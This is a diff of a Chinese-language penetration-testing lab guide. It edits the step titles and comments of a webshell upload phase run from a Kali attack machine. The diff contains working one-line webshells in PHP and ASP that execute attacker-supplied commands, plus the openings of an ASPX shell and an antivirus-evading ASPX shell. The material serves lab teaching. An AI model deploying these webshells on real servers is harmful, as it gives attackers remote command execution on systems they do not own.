@@ -289,18 +289,18 @@ Write-Host "实验七环境初始化完成！" -ForegroundColor Green
 
 ### 阶段一：WebShell上传与利用
 
-**步骤1：生成各类WebShell**
+**步骤1：认识不同WebShell格式（当前实验重点使用 ASPX）**
 
 ```bash
 # 在Kali攻击机上执行
 
-# PHP一句话木马
+# PHP一句话木马（用于识别与对比，非当前环境重点）
 echo '<?php @eval($_POST["cmd"]);?>' > /tmp/shell.php
 
-# ASP一句话木马
+# ASP一句话木马（用于识别与对比，非当前环境重点）
 echo '<%execute(request("cmd"))%>' > /tmp/shell.asp
 
-# ASPX一句话木马（适配IIS）
+# ASPX一句话木马（适配当前 IIS + ASP.NET 环境，建议重点验证）
 cat > /tmp/shell.aspx << 'EOF'
 <%@ Page Language="Jscript"%>
 <%
@@ -314,7 +314,7 @@ if(cmd != null){
 %>
 EOF
 
-# 免杀ASPX木马（使用冰蝎/哥斯拉加密通信的格式，此处演示简单版本）
+# 免杀ASPX木马（扩展了解，用于说明现代WebShell对抗）
 cat > /tmp/shell_encrypted.aspx << 'EOF'
 <%@ Page Language="C#" %>
 <%@ Import Namespace="System" %>
